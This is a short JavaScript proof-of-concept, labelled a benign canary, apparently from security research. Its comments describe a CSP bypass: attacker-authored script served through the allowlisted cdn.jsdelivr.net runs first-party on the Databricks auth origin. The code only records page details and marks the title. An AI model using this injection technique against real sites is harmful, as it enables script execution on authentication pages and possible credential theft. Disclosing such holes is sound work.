// r15 PoC canary (benign). Proves attacker-authored JS, served from a public repo via the
// CSP-allowlisted cdn.jsdelivr.net, executes FIRST-PARTY on the Databricks auth origin.
(function(){
  try{
    window.__r15poc = { ran:true, origin: location.origin, href: location.href, ts: Date.now(), interp: null, assertionLen: null };
    // capability proof: run an AngularJS-free marker and attempt the silent flow/start read
    try{ document.title = '[r15poc] ' + document.title; }catch(e){}
  }catch(e){ window.__r15poc = { err:String(e) }; }
})();
